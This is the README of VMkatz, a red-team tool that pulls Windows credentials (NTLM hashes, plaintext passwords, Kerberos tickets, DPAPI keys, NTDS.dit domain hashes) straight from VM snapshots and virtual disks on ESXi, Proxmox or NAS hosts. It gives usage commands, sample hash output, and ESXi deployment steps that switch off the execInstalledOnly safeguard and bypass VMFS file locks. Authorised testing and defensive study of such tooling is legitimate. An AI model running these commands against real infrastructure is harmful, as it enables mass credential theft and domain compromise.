# VMkatz

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Build](https://github.com/nikaiw/VMkatz/actions/workflows/release.yml/badge.svg)](https://github.com/nikaiw/VMkatz/actions/workflows/release.yml)
[![Clippy](https://github.com/nikaiw/VMkatz/actions/workflows/clippy.yml/badge.svg)](https://github.com/nikaiw/VMkatz/actions/workflows/clippy.yml)
[![Platform](https://img.shields.io/badge/platform-linux%20|%20windows%20|%20macos%20|%20esxi-lightgrey)]()

## Too Big to Steal

You are three weeks into a red team engagement. Your traffic crawls through a VPN, then bounces across four SOCKS proxies chained through compromised jump boxes before it touches the target network. Every packet takes the scenic route.

After days of lateral movement you land on a NAS attached to the virtualization cluster and the directory listing hits different: rows upon rows of `.vmdk`, `.vmsn`, `.sav`. Hundreds of gigabytes of virtual machines - domain controllers, admin workstations, the crown jewels - sitting right there.

But your link wheezes at 200 KB/s. Pulling a single 100 GB disk image would take **six days**, and every hour of sustained exfil is another chance the SOC spots the anomaly, burns your tunnel, and the whole chain collapses.

Without VMkatz, the traditional workflow looks like this: exfiltrate the entire VM disk or memory snapshot, mount it locally, install a full Windows analysis stack, load the snapshot into a debugger or use mimikatz on a booted copy, and manually piece together credentials from each VM - one at a time. Multiply that by a dozen VMs on the cluster and you are looking at days of bandwidth, tooling, and post-processing.

VMkatz exists because you shouldn't have to exfiltrate what you can read in place. It extracts Windows secrets - NTLM hashes, DPAPI master keys, Kerberos tickets, cached domain credentials, LSA secrets, NTDS.dit - directly from VM memory snapshots and virtual disks, **on the NAS, the hypervisor, wherever the VM files are**.

A single static binary, ~2.5 MB. Drop it on the ESXi host, the Proxmox node, or the NAS. Point it at a `.vmsn`, `.vmdk`, or an entire VM folder. Walk away with credentials, not disk images.

## What It Extracts

### From memory snapshots (LSASS)
All 9 SSP credential providers that mimikatz implements:

| Provider | Data | Notes |
| --- | --- | --- |
| MSV1_0 | NT/LM hashes, SHA1 | Physical-scan fallback for paged entries |
| WDigest | Plaintext passwords | Linked-list walk + `.data` fallback |
| Kerberos | AES/RC4/DES keys, tickets (`.kirbi`/`.ccache`) | AVL tree walk, often paged in VM snapshots |
| TsPkg | Plaintext passwords | RDP sessions only |
| DPAPI | Master key cache (GUID + decrypted key) | SHA1 masterkey for offline DPAPI decrypt |
| SSP | Plaintext credentials | `SspCredentialList` in `msv1_0.dll` |
| LiveSSP | Plaintext credentials | Requires `livessp.dll` (rare post-Win8) |
| Credman | Stored credentials | Hash-table + single-list enumeration |
| CloudAP | Azure AD tokens | Typically empty for local-only logon |

### From virtual disks (offline)
- **SAM hashes**: Local account NT/LM hashes
- **LSA secrets**: Service account passwords, auto-logon credentials, machine account keys
- **Cached domain credentials**: DCC2 hashes (last N domain logons)
- **DPAPI master keys**: Hashcat-ready hashes from user master key files (`$DPAPImk$` — modes 15300/15900)
- **NTDS.dit**: Full Active Directory hash extraction from domain controller disks, natively from the ESE database - no impacket or external tools needed

## Supported Inputs

| Format | Extensions | Source | Status |
| --- | --- | --- | --- |
| VMware snapshots | `.vmsn` + `.vmem` | Workstation, ESXi | Tested |
| VirtualBox saved states | `.sav` | VirtualBox | Tested |
| QEMU/KVM ELF core dumps | `.elf` | `virsh dump`, `dump-guest-memory` | Untested |
| Hyper-V saved states | `.vmrs` | Hyper-V 2016+ (native parser) | Untested |
| Hyper-V memory dumps | `.bin`, `.raw` | Legacy saved states, raw dumps | Untested |
| VMware virtual disks | `.vmdk` (sparse + flat) | Workstation, ESXi | Tested |
| VirtualBox virtual disks | `.vdi` | VirtualBox | Tested |
| QEMU/KVM virtual disks | `.qcow2` | QEMU, Proxmox | Tested |
| Hyper-V virtual disks | `.vhdx`, `.vhd` | Hyper-V | Untested |
| VMFS-6 raw SCSI devices | `/dev/disks/...` | ESXi datastores (bypasses file locks) | Tested |
| LVM block devices | `/dev/...` | Proxmox LVM-thin, raw LVs | Tested |
| Raw registry hives | `SAM`, `SYSTEM`, `SECURITY` | Exported from disk or `reg save` | Tested |
| Raw NTDS.dit | `ntds.dit` + `SYSTEM` | Copied from domain controller | Tested |
| LSASS minidump | `.dmp` | `--dump lsass`, procdump, Task Manager | Tested |
| VM directories | any folder | Auto-discovers all processable files | Tested |

**Target OS**: Windows XP SP3 through Windows Server 2025 (x86 PAE + x64, auto-detected).

## Quick Start

```bash
# Build (default features: all hypervisors + disk + NTDS)
cargo build --release

# Extract LSASS credentials from a VMware snapshot
./vmkatz snapshot.vmsn

# Same, with pagefile resolution for paged-out creds
./vmkatz --disk disk.vmdk snapshot.vmsn

# Extract SAM/LSA/DCC2 from a virtual disk (auto-detected)
./vmkatz disk.vmdk

# Extract from raw registry hives (auto-detects SAM/SYSTEM/SECURITY)
./vmkatz SAM SYSTEM
./vmkatz SAM SYSTEM SECURITY

# Extract AD hashes from raw NTDS.dit + SYSTEM hive
./vmkatz ntds.dit SYSTEM

# Extract from VMFS-6 on ESXi (bypasses file locks on running VMs)
./vmkatz --vmfs-device /dev/disks/naa.xxx --vmdk 'MyVM/MyVM-flat.vmdk'

# List all VMs on a VMFS-6 datastore
./vmkatz --vmfs-device /dev/disks/naa.xxx --vmfs-list

# Extract from all VMs on a VMFS-6 datastore
./vmkatz --vmfs-device /dev/disks/naa.xxx

# Extract AD hashes from a domain controller disk (NTDS.dit)
./vmkatz --ntds /dev/pve/vm-102-disk-0

# Extract AD hashes with password history
./vmkatz --ntds --ntds-history dc-disk.qcow2

# Point at a VM folder and let it find everything
./vmkatz /path/to/vm-directory/

# List running processes
./vmkatz --list-processes snapshot.vmsn

# Dump LSASS as minidump (for pypykatz, etc.)
./vmkatz --dump lsass -o lsass.dmp snapshot.vmsn

# Output as hashcat-ready hashes (mode 1000)
./vmkatz --format hashcat snapshot.vmsn

# Output as NTLM pwdump format
./vmkatz --format ntlm snapshot.vmsn

# Export Kerberos tickets
./vmkatz --kirbi snapshot.vmsn        # export as .kirbi files
./vmkatz --ccache snapshot.vmsn       # export as .ccache file

# Parse LSASS minidump
./vmkatz lsass.dmp

# Degraded extraction from truncated/partial memory
./vmkatz --carve partial-snapshot.vmsn

# Show all sessions including empty ones
./vmkatz --all snapshot.vmsn
```

### Advanced options

```bash
# Recursively scan a directory tree for all VM files
./vmkatz -r /vmfs/volumes/datastore1/

# Filter to only snapshots or only disks in directory mode
./vmkatz --scan snapshot /path/to/vm/
./vmkatz --scan disk /path/to/vm/

# Filter output to specific providers
./vmkatz --provider msv,kerberos snapshot.vmsn

# Enable EPT scanning for VBS/Credential Guard VMs
./vmkatz --ept snapshot.vmsn

# Verbose output (memory regions, process list, debug info)
./vmkatz -v snapshot.vmsn

# Dump with custom Windows build number
./vmkatz --dump lsass --build 26100 -o lsass.dmp snapshot.vmsn
```

## Output Formats

| Format | Flag | Description |
| --- | --- | --- |
| `text` | `--format text` (default) | Full credential dump with session metadata |
| `brief` | `--format brief` | Compact one-line-per-credential summary |
| `ntlm` | `--format ntlm` | `DOMAIN\user:::hash:::` pwdump format |
| `hashcat` | `--format hashcat` | Raw hashes: mode 1000 (NTLM), mode 2100 (DCC2), mode 15300/15900 (DPAPI) |
| `csv` | `--format csv` | Machine-readable, all fields |

In `text` mode, well-known blank password hashes (`31d6cfe0...` for NTLM, `aad3b435...` for LM) are annotated with `(blank)`.

Use `--color auto|always|never` to control colored terminal output (default: `auto`, detects TTY). Colors highlight usernames, section headers, interesting hashes, and plaintext passwords.

## Example Output

### LSASS extraction (default text)
```
$ vmkatz snapshot.vmsn
[*] Providers: MSV(ok) WDigest(ok) Kerberos(paged) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(paged)

[+] 8 logon session(s), 3 with credentials:

  LUID: 0x3e7 (SYSTEM)
  Username: YOURPC$
  Domain: WORKGROUP
  [DPAPI]
    GUID          : 94e9f320-d4a0-4737-b34e-ab106f485c0e
    MasterKey     : d0f110675ca73f39d1370bdfd...
    SHA1 MasterKey: ea72698de207dab9e01fd9ab63f322ae82b4a4bb

  LUID: 0x240be
  Session: 2 | LogonType: Unknown
  Username: user
  Domain: YOURPC
  LogonServer: YOURPC
  SID: S-1-5-21-4247878743-2693906039-1959858616-1000
  [MSV1_0]
    NT Hash : bbf7d1528afa8b0fdd40a5b2531bbb6d
    SHA1    : 6ed12f1e60b17cfff120d753029314748b58aa05
    DPAPI   : 6ed12f1e60b17cfff120d753029314748b58aa05
```

### Hashcat mode
```
$ vmkatz --format hashcat snapshot.vmsn
[*] Providers: MSV(ok) WDigest(ok) ...
bbf7d1528afa8b0fdd40a5b2531bbb6d
```

### NTDS.dit extraction
```
$ vmkatz --ntds /dev/pve/vm-102-disk-0

[+] NTDS Artifacts:
  Partition offset : 0x100000
  ntds.dit size    : 20971520 bytes
  SYSTEM size      : 14155776 bytes
  Bootkey          : 9ae365ba5244457bfc2a26187a28346a
  Hashes extracted : 18

[+] AD NTLM Hashes:
  RID: 500    Administrator            current    NT:c66d72021a2d4744409969a581a1705e
  RID: 502    krbtgt                   current    NT:9c238cafb7b4447e5f701c71dbdcf636
  RID: 1000   vagrant                  current    NT:e02bc503339d51f71d913c245d35b50b
  ...
```

### Pagefile resolution
```
$ vmkatz --disk disk.vmdk snapshot.vmsn
[+] Pagefile: 320.0 MB
[*] Providers: MSV(ok) WDigest(ok) ...
[+] File-backed: 12540 DLL pages resolved from disk
[+] Pagefile: 2274 pages resolved from disk
```

## Pagefile Resolution

Memory snapshots only capture physical RAM. Credentials that were paged to disk at snapshot time appear as `(paged out)`. The `--disk` flag reads pagefile.sys from the VM's virtual disk to resolve these.

In **directory mode**, this happens automatically: VMkatz discovers both the snapshot and the disk image, and resolves paged memory without manual flags.

## Deployment on ESXi

VMkatz compiles to a static musl binary that runs directly on ESXi without dependencies:

```bash
# Cross-compile for ESXi (musl static)
cargo build --release --target x86_64-unknown-linux-musl

# Upload (~3 MB)
scp target/x86_64-unknown-linux-musl/release/vmkatz root@esxi:/tmp/

# On ESXi 8.0+, allow non-VIB binaries (requires once)
esxcli system settings advanced set -o /User/execInstalledOnly -i 0

# Extract from a live VM snapshot
/tmp/vmkatz /vmfs/volumes/datastore1/MyVM/MyVM-Snapshot1.vmsn

# Extract SAM from a powered-off VM disk
/tmp/vmkatz /vmfs/volumes/datastore1/MyVM/MyVM-flat.vmdk
```

## VMFS-6 Raw Device Access (ESXi)

On ESXi, VMFS locks prevent reading flat VMDK files from running VMs via the mounted filesystem. VMkatz includes a self-contained VMFS-6 parser that reads directly from the raw SCSI device, bypassing file locks entirely — no `vmkfstools`, no `.sbc.sf` access, no unmounting.

### Discovery

VMkatz auto-discovers VMFS-6 devices by scanning `/dev/disks/` for SCSI LUNs containing VMFS superblocks, then enumerates the VMFS directory tree to find all flat VMDKs and the VMs they belong to.

```bash
# Discover all VMFS-6 datastores, list their VMs, and print ready-to-run commands
/tmp/vmkatz --vmfs-list
```

Example output:
```
[+] VMFS-6 devices:
    /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc — RAID0_local
    /dev/disks/naa.600508b4000adfe0d80b99cf3ce0c0c7 — NAS_datastore

[+] RAID0_local — 5 flat VMDKs:
--vmfs-device /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc --vmdk 'DC01/DC01-flat.vmdk'
--vmfs-device /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc --vmdk 'WEB01/WEB01-flat.vmdk'
...
```

The output is designed as copy-pasteable command-line arguments. Filter to a specific device with `--vmfs-device`:

```bash
# List VMDKs on a specific device only
/tmp/vmkatz --vmfs-list --vmfs-device /dev/disks/naa.60003ff44dc75adcb3d1cbcd6d5049dc
```

### Extraction modes

```bash
# Single VM — extract SAM/LSA/DCC2 from one flat VMDK
/tmp/vmkatz --vmfs-device /dev/disks/naa.xxx --vmdk 'DC01/DC01-flat.vmdk'

# Single VM — extract NTDS.dit from a domain controller
/tmp/vmkatz --vmfs-device /dev/disks/naa.xxx --vmdk 'DC01/DC01-flat.vmdk' --ntds

# All VMs — auto-scan the entire datastore
/tmp/vmkatz --vmfs-device /dev/disks/naa.xxx
```

In auto-scan mode (no `--vmdk`), VMkatz discovers every flat VMDK on the device, checks each for NTFS partitions (skipping Linux/BSD VMs), and extracts credentials from all Windows VMs in a single pass. Non-Windows VMs are silently skipped.

### How it works

The parser resolves the full VMFS-6 on-disk layout without any mounted filesystem:

```
/dev/disks/naa.xxx
  └─ LVM volume header (magic 0xC001D00D at offset 0x100000)
       └─ VMFS superblock (magic 0x2FABF15E at offset 0x200000)
            └─ SFD bootstrap → FDC resource (file descriptor cache)
                 └─ Root directory (FD address 0x00000004)
                      └─ VM directories → flat VMDK files
                           └─ File data (sub-blocks, pointer blocks, large file blocks)
```

Supports all VMFS-6 address types: small file blocks (SFB), sub-blocks (SB), pointer blocks (PB/PB2), large file blocks (LFB), and double-indirect addressing. Reads are direct `pread(2)` calls on the raw device — no caching layer or filesystem driver needed.

## Build Features

VMkatz is modular. Features can be enabled/disabled at compile time:

| Feature | Description | Default |
| --- | --- | --- |
| `vmware` | VMware `.vmsn`/`.vmem` snapshot support | Yes |
| `vbox` | VirtualBox `.sav` saved-state support | Yes |
| `qemu` | QEMU/KVM ELF core dump support | Yes |
| `hyperv` | Hyper-V `.vmrs`/`.bin`/`.raw` dump support (native `.vmrs` parser) | Yes |
| `sam` | Disk extraction (SAM/LSA/DCC2) and disk format handlers | Yes |
| `ntds.dit` | NTDS.dit AD extraction (`--ntds`, `--ntds-history`). Requires `sam` | Yes |
| `carve` | Degraded extraction from partial/truncated memory (`--carve`) | Yes |
| `dump` | Process memory dump as minidump (`--dump`) | Yes |
| `vmfs` | VMFS-6 raw parser for ESXi SCSI devices (`--vmfs-device`). Requires `sam` | Yes |

```bash
# Full build with everything (default)
cargo build --release

# Minimal VMware-only build (no carve, no dump, no disk)
cargo build --release --no-default-features --features vmware

# Memory extraction only (all hypervisors, no disk/carve/dump)
cargo build --release --no-default-features --features "vmware vbox qemu hyperv"

# Disk-only build (SAM + NTDS, no memory snapshot support)
cargo build --release --no-default-features --features "sam ntds.dit"

# Memory + carve (no dump, no disk)
cargo build --release --no-default-features --features "vmware vbox qemu hyperv carve"
```

## Module Architecture

```
src/
├── main.rs              CLI dispatch, format detection, output formatting
├── lib.rs               Crate root — feature-gated module declarations
├── error.rs             VmkatzError type
├── utils.rs             Endian helpers, hex, UTF-16LE decode
├── memory/
│   └── reader.rs        PhysicalMemory and VirtualMemory traits
├── pe/                  PE header parser (exports, sections, data directories)
├── minidump.rs          MDMP parser — VirtualMemory trait over minidump regions
├── discover.rs          Directory/recursive auto-discovery of VM files
├── paging/
│   ├── mod.rs           4-level x64 page table walker (CR3 → PTE)
│   ├── translate.rs     Address translation core
│   ├── entry.rs         Page table entry decoding
│   ├── ept.rs           Extended Page Table scanner (VBS/nested Hyper-V)
│   ├── filebacked.rs    DLL section mapping from disk
│   └── pagefile.rs      Pagefile.sys fault resolution from disk
├── windows/
│   ├── process.rs       EPROCESS discovery (System process, process enumeration)
│   └── offsets.rs       EPROCESS offset tables (WinXP SP3 → Win11 24H2, x64 + x86 PAE)
├── lsass/
│   ├── finder.rs        Main extraction orchestrator (PhysicalMemory + minidump paths)
│   ├── crypto.rs        LSASS decryption (AES-CBC, 3DES-CBC, DES-X-CBC, RC4)
│   ├── patterns.rs      Signature patterns for crypto key discovery in DLL sections
│   ├── types.rs         Credential, LogonSession, DpapiCredential structs
│   ├── msv.rs           MSV1_0 provider (NT/LM/SHA1 hashes)
│   ├── wdigest.rs       WDigest provider (plaintext passwords)
│   ├── kerberos.rs      Kerberos provider (tickets, passwords)
│   ├── tspkg.rs         TsPkg provider (RDP plaintext)
│   ├── dpapi.rs         DPAPI provider (master key cache)
│   ├── ssp.rs           SSP provider (plaintext credentials)
│   ├── livessp.rs       LiveSSP provider (plaintext, rare post-Win8)
│   ├── credman.rs       Credential Manager (stored credentials)
│   ├── cloudap.rs       CloudAP provider (Azure AD tokens)
│   └── carve.rs         [feature: carve] Degraded extraction for partial memory
├── dump.rs              [feature: dump] Process memory → minidump writer
├── vmware/              [feature: vmware] VMware .vmsn/.vmem/.vmss layer
├── vbox/                [feature: vbox] VirtualBox .sav layer
├── qemu/                [feature: qemu] QEMU ELF core dump layer
├── hyperv/              [feature: hyperv] Hyper-V .vmrs/.bin/.raw layer (native VMRS parser)
├── sam/                 [feature: sam] SAM/LSA/DCC2 + DPAPI + disk format handlers
│   ├── mod.rs           Orchestration, disk extraction entry point
│   ├── hive.rs          Windows registry hive parser (regf format)
│   ├── bootkey.rs       Bootkey extraction from SYSTEM hive
│   ├── hashes.rs        SAM hash decryption (AES-CBC, RC4, MD5, DES)
│   ├── lsa.rs           LSA secrets decryption (DPAPI system keys, service passwords)
│   ├── cache.rs         Cached domain credentials (DCC2)
│   ├── dpapi_masterkey.rs  DPAPI master key file parser (hashcat 15300/15900)
│   ├── partition.rs     MBR/GPT partition table parser
│   ├── ntfs_reader.rs   NTFS file reader (SAM/SYSTEM/SECURITY discovery)
│   ├── ntfs_fallback.rs NTFS fallback parser (no external crate)
│   ├── disk_fallbacks.rs Fallback hive search for non-standard layouts
│   └── vmdk_scan.rs     Sparse VMDK descriptor + extent parser
├── disk/                Virtual disk format handlers
│   ├── vmdk.rs          VMware sparse/flat VMDK
│   ├── vdi.rs           VirtualBox VDI (+ differencing chain)
│   ├── qcow2.rs         QEMU QCOW2 (+ backing files)
│   ├── vhd.rs           Hyper-V VHD (legacy)
│   ├── vhdx.rs          Hyper-V VHDX
│   ├── raw.rs           Raw/block device passthrough
│   └── vmfs.rs          [feature: vmfs] VMFS-6 raw parser (LVM → SFD → FDC → FD → data)
└── ntds/                [feature: ntds.dit] NTDS.dit ESE database parser
    ├── mod.rs           PEK decryption, hash extraction pipeline
    └── ese.rs           JET Blue database primitives (pages, B+ trees, columns)
```

## Tested Targets

Tested across 7 Windows versions and 5 hypervisors/platforms.

| Hypervisor | Guest OS | Artifact | Result | Notes |
| --- | --- | --- | --- | --- |
| VMware Workstation | Windows 10 22H2 x64 | LSASS (`.vmsn`) | PASS | 3 snapshots |
| VMware Workstation | Windows 10 22H2 x64 | LSASS + pagefile (`.vmsn` + `.vmdk`) | PASS | Resolves paged-out credentials |
| VMware Workstation | Windows 10 22H2 x64 | SAM / LSA / DCC2 (`.vmdk`) | PASS | |
| VMware Workstation | Windows 10 22H2 x64 | Folder mode | PASS | Auto-discovers `.vmsn` + `.vmdk` |
| VirtualBox | Windows 10 22H2 x64 | LSASS (`.sav`) | PASS | |
| VirtualBox | Windows 10 22H2 x64 | LSASS + pagefile (`.sav` + `.vdi`) | PASS | |
| VirtualBox | Windows 10 22H2 x64 | SAM / LSA / DCC2 (`.vdi`) | PASS | |
| ESXi 8.0 | Windows 7 SP1 x64 | LSASS (`.vmsn`) | PASS | |
| ESXi 8.0 | Windows 10 22H2 x64 | LSASS (`.vmsn`) | PASS | 2 VMs |
| ESXi 8.0 | Windows Server 2012 x64 | LSASS (`.vmsn`) | PASS | 2 VMs |
| ESXi 8.0 | Windows Server 2016 x64 | LSASS (`.vmsn`) | PASS | 3 VMs |
| ESXi 8.0 | Windows Server 2019 x64 | LSASS (`.vmsn`) | PASS | |
| ESXi 8.0 | Windows 11 x64 | LSASS (`.vmsn`) | PASS | 2 VMs, no VBS |
| ESXi 8.0 | Windows 11 x64 | SAM (flat `.vmdk`) | PASS | Powered-off VM |
| ESXi 8.0 | Windows 11 x64 (VBS) | LSASS (`.vmsn`) | FAIL | Credential Guard / VBS |
| Proxmox 8 | Windows Server 2016 x64 | SAM / LSA / DCC2 (LVM block device) | PASS | Live + stopped VMs |
| Proxmox 8 | Windows Server 2019 x64 | SAM / LSA / DCC2 (LVM block device) | PASS | 3 VMs, incl. DCs |
| Proxmox 8 | Windows Server 2019 x64 | NTDS.dit (LVM block device) | PASS | 3 DCs (GOAD lab), 8KB pages, verified against impacket |
| Proxmox 8 | Windows Server 2025 x64 | SAM / LSA (LVM block device) | PASS | |
| Proxmox 8 | Windows Server 2025 x64 | NTDS.dit (LVM block device) | PASS | 32KB pages, native ESE parsing |
| Proxmox 8 | Windows 11 x64 | SAM / LSA (LVM block device) | PASS | Live VM |
| ESXi 8.0 | Windows Server 2012 x64 | SAM / LSA / DCC2 (VMFS-6 raw) | PASS | Running VM, file locks bypassed |
| ESXi 8.0 | Windows Server 2016 x64 | SAM / LSA / DCC2 (VMFS-6 raw) | PASS | Running VM |
| ESXi 8.0 | Windows Server 2019 x64 | SAM / LSA / DCC2 (VMFS-6 raw) | PASS | Running VM |
| ESXi 8.0 | Windows 11 x64 | SAM (VMFS-6 raw) | PASS | Running VM |

### Known limitations
- **VBS / Credential Guard**: VMs with Virtualization-Based Security enabled use nested Hyper-V page tables. The VMEM captured by ESXi is 99% zero pages because the actual kernel memory is behind Hyper-V's SLAT. An EPT walker is implemented but cannot yet recover credentials from these VMs. SAM extraction from the virtual disk still works.
- **Kerberos**: Kerberos credentials are frequently paged out in VM snapshots. The provider reports `paged` but the data is legitimately absent from RAM. Pagefile resolution (`--disk`) can recover some entries.
- **Hyper-V**: Modern `.vmrs` saved states (Hyper-V 2016+) are supported via a native parser reverse-engineered from `vmsavedstatedumpprovider.dll` — no Microsoft DLL needed. Legacy `.bin`/`.raw` dumps are also supported via identity-mapped reading. VHDX/VHD disk extraction is implemented but untested. QEMU/KVM ELF core dumps are implemented but also untested.
- **x86 (32-bit) guests**: Supported with PAE paging (default since Vista). Covers WinXP SP3 through Win10 x86. Pre-Vista (XP/2003) extracts MSV/DPAPI only; Vista+ x86 extracts all 9 SSP providers. Non-PAE 32-bit (rare, XP-only) is not supported.

## How It Works

1. **Layer**: Opens the VM snapshot format and exposes guest physical memory as a flat address space. Each hypervisor format (VMware regions, VBox page map, QEMU ELF segments, Hyper-V identity map, Hyper-V VMRS key-value store with LZNT1 decompression) is abstracted behind a common `PhysicalMemory` trait.

2. **Process discovery**: Scans physical memory for EPROCESS structures using signature matching (`System\0` at ImageFileName offset) with auto-detection across 18 known offset tables (WinXP SP3 through Win11 24H2, x86 PAE + x64).

3. **Page table walking**: Translates virtual addresses to physical using the kernel DTB (CR3). Supports 4-level x64 page tables and 3-level PAE (pre-Vista x86). TLB cache (256-entry direct-mapped), large pages (2MB/1GB), PCID bits, and pagefile fault resolution.

4. **LSASS extraction**: Locates `lsass.exe`, maps its virtual address space, finds DLLs (`lsasrv.dll`, `msv1_0.dll`, `wdigest.dll`, `kerberos.dll`, `dpapisrv.dll`, etc.) via PEB/LDR enumeration, resolves crypto keys via pattern matching on `.text`/`.data` sections, and decrypts credentials in-memory using 3DES-CBC, AES-CBC, AES-CFB, DES-X-CBC, or RC4 (auto-detected by buffer alignment and OS version). Also works on LSASS minidumps (`.dmp`).

5. **Disk extraction**: Parses the virtual disk container (sparse VMDK, VDI, QCOW2, VHDX, VHD, LVM block devices), finds the Windows partition (MBR/GPT), walks NTFS MFT to locate `SAM`, `SYSTEM`, `SECURITY` hives, and decrypts hashes using the boot key. On ESXi, a native VMFS-6 parser reads flat VMDKs directly from raw SCSI devices, bypassing filesystem locks on running VMs.

6. **NTDS extraction**: For domain controllers (`--ntds`), locates `NTDS.dit` and the `SYSTEM` hive on disk, then parses the ESE (JET Blue) database natively. Traverses B+ trees to read the `datatable`, extracts the PEK (Password Encryption Key) using the bootkey, and decrypts NT/LM hashes for every AD account. Supports both 8KB pages (Windows Server 2019 and earlier) and 32KB large pages (Windows Server 2025), as well as RC4 (legacy), AES pre-Win2016, and AES Win2016+ (v0x13) hash blob formats.

## Acknowledgements

- [**mimikatz**](https://github.com/gentilkiwi/mimikatz) by Benjamin Delpy ([@gentilkiwi](https://twitter.com/gentilkiwi)) -- the definitive reference for LSASS internals and Windows credential decryption.
- [**pypykatz**](https://github.com/skelsec/pypykatz) by Tamás Jós ([@skelsec](https://twitter.com/skelsec)) -- pure Python mimikatz reimplementation, used as cross-reference for SAM/LSA/DCC2 extraction.
- [**Impacket**](https://github.com/fortra/impacket) by Fortra (originally Alberto Solino [@agsolino](https://twitter.com/agsolino)) -- reference implementation for NTDS.dit extraction and the pwdump output format.
- [**Vergilius Project**](https://www.vergiliusproject.com/) -- documented Windows kernel structures used to verify EPROCESS field offsets across all supported builds (XP through Win11 24H2).
- [**dissect.vmfs**](https://github.com/fox-it/dissect.vmfs) by Fox-IT (NCC Group) -- Python VMFS parser from the Dissect DFIR framework, used as reference for VMFS-6 on-disk structures (LVM, superblock, resource files, file descriptors).
- [**vmfs-tools**](https://github.com/glandium/vmfs-tools) by Mike Hommey -- open-source VMFS3/5 implementation that documents core on-disk structures and address types.
